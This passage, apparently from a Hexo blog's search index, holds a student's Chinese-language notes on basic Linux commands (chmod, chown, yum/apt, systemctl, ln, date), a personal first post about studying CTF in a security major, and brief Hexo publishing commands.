u&#x3D;rwx,g&#x3D;rx,o&#x3D;x test 改后：rwxr-x–x</p><p>-R表示不仅修改它本身，把里面的文件都一起修改</p><p>chmod 751 hello.txt</p><p><img src="/images/image-20260121192412310.png" alt="image-20260121192412310"></p><p>chown修改文件、文件夹的所属用户、用户组</p><p>普通用户无法修改，只能root</p><p>1.语法：chown [-R] [用户] [:] [用户组] 文件或文件夹</p><p>选项：</p><p>-R 同chmod，对文件夹内全部内容应用相同规则</p><p>用户：修改所属用户</p><p>用户组：修改所属用户组</p><p>：用于分隔用户和用户组</p><p>2.实例：</p><p>chown root：itheima hello.text</p><p>将hello.text所属用户改为root，所属用户组改为itheima</p><p>chown -R root test</p><p>将未见加test所属的用户修改为root，并对文件夹内全部内用应用同样规则</p><p>3.切换root</p><p>su -</p><p>快捷键：</p><p>1.CTRL+c 强制停止</p><p>2.CTRL+d 退出用户登录或退出程序</p><p>3.history：查看历史输入的命令</p><p>grep 筛选的东西</p><p>4.！</p><p>！p搜索离现在最近的跑开头的命令</p><p>5.ctrl a：跳到命令开头</p><p>6.ctrl e：跳到命令结尾</p><p>7.ctrl 左键：左跳一单词</p><p>8.ctrl 右键：右跳一单词</p><p>9.ctrl l：清屏</p><p>clear</p><p>软件管理器rpm的安装</p><p>yum&#x2F;apt：联网自动化安装Linux软件，自动解决依赖问题</p><p>yum：centos</p><p>apt：debiansu （ubuntu）</p><p>1.语法：yum [-y] [install | remove | search] 程序名称</p><p>apt [-y] [install | remove | search] 程序名称</p><p>-y：不在询问</p><p>2.要求：</p><p>需要root权限：su&#x2F;sudo提权</p><p>sudo su - root</p><p>需要联网</p><p>systemctl命令</p><p>0.目的：控制软件的启动和关闭</p><p> 服务：能够被这个命令管理的软件</p><p>例如：</p><p>NetworkManager主网络服务</p><p>network副网络服务</p><p>firewalld防火墙服务</p><p>sshd，ssh远程登陆</p><p>1.语法：</p><p>systemctl start | stop | status | enable | disable 服务名</p><p>1.1 status 查看状态</p><p>enable 开启开机自启</p><p>disable关闭开机自启</p><p>软连接（快捷方式）</p><p>ln命令创建软连接</p><ol><li>语法：</li></ol><p>ln -s 参数1 ~参数2</p><p>-s 选项： 创建软连接</p><p>参数1 ： 被链接的文件或文件夹</p><p>参数2 ： 链接到哪里去</p><ol start="2"><li>例子</li></ol><p>ln -s &#x2F;etc&#x2F;yum.conf ~&#x2F;yum.conf</p><p>ln -s &#x2F;etc&#x2F;yum&#x2F; ~&#x2F;yum </p><p>日期和时区</p><ol><li>date</li></ol><p>通过date命令在命令行中查看系统时间</p><p>语法：date [-d] [+格式化字符串]</p><p>​        -d 按照给定字符串显示日期，一般用于日期计算</p><p>​        格式化字符：通过特定字符串标记，来控制显示的日期格式</p><ol><li>%Y 年</li><li>%y 年份后2位（2006）：06 01-99</li><li>%m 月份   01-12</li><li>%d 日  01-31</li><li>%H  时00-23</li><li>%M min 00-59</li><li>%S s秒 00-60</li></ol><p>%s 自1970-01-01 00：00：00 UT</p>]]></content>
      
      
      <categories>
          
          <category> linux学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的第一篇博客omg</title>
      <link href="/posts/14f8f679.html"/>
      <url>/posts/14f8f679.html</url>
      
        <content type="html"><![CDATA[<p>-–</p><h2 id="我的第一篇博客omg"><a href="#我的第一篇博客omg" class="headerlink" title="我的第一篇博客omg"></a>我的第一篇博客omg</h2><p>这是我的第一篇博客，</p><p>是25.11.12写的，</p><p>当时带着好奇心来到网安专业，进入了ctf学习，埋头学着学着喜欢上了这个我之前觉得很深奥的世界，看到了很多大佬的博客，决定自己也要写个博客，我觉得真的很想在这里搭建了属于自己的知识世界，我想要把学习内容记录在自己的博客里，于是留下了一篇关于sqlmap怎么打开和使用的笔记。</p><p>感觉自己当时好笨，怎么连sqlmap的使用都不会；</p><p>但是又觉得当时自己在探索未知事务的样子也很可爱。</p><p>现在是26.1.21，</p><p>隔了这么久，期间经历了社团选拔，英语四级考试，长城杯比赛，期末考试，终于有时间再来为我的博客增添一些家具了。（我一直想着等寒假了我就有空了）</p><p>欢迎大家来到这里，或许这里还有很多不足，我会慢慢把一些功能丰富上去的。</p><p>我想说：我热爱这个领域，不仅是因为它是我的专业，更因为它这位朋友让我间接认识了很多大佬，思路，知识。</p><p>我爱它，它是我大学生活里面最重要的朋友，也是我的唯一陪伴。</p>]]></content>
      
      
      <categories>
          
          <category> 个人随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第一篇博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>git使用方法</title>
      <link href="/posts/6b41227f.html"/>
      <url>/posts/6b41227f.html</url>
      
        <content type="html"><![CDATA[<h2 id="简单版本"><a href="#简单版本" class="headerlink" title="简单版本"></a>简单版本</h2><ol><li><h2 id="打开-source-posts-里的新-md-文件，写内容-粘图片；"><a href="#打开-source-posts-里的新-md-文件，写内容-粘图片；" class="headerlink" title="打开 source/_posts 里的新.md 文件，写内容 + 粘图片；"></a>打开 <code>source/_posts</code> 里的新.md 文件，写内容 + 粘图片；</h2></li><li>执行命令预览：<code>hexo server -p 4001</code>；   <code>hexo clean &amp;&amp; hexo server -p 4001</code></li><li>执行命令发布：<code>hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</code>。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 个人随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git使用方法 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
